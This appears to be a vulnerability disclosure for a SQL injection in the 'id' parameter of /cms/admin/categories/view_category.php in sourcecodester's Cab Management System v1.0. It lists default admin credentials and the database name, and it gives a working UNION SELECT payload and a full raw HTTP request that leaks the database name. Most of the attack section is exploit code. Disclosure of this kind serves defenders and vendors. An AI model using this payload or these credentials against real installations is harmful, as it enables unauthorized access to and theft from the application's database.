# Cab Management System v1.0 by sourcecodester has SQL injection 1

BUG_Author: Du Kai

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15180/cab-management-system-phpoop-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /cms/admin/categories/view_category.php

Vulnerability location: /cms/admin/categories/view_category.php?id=, id

dbname=cms_db

[+] Payload: /cms/admin/categories/view_category.php?id=0%27%20union%20select%201,database(),3,4,5,6,7--+ // Leak place ---> id

```sql
GET /cms/admin/categories/view_category.php?id=0%27%20union%20select%201,database(),3,4,5,6,7--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=eip4v1c8uqq26lj07th6057jko
Connection: close


```

<img width="1112" height="582" alt="image" src="https://github.com/user-attachments/assets/b9f07f21-ef97-429a-8227-5e2d446b1093" />
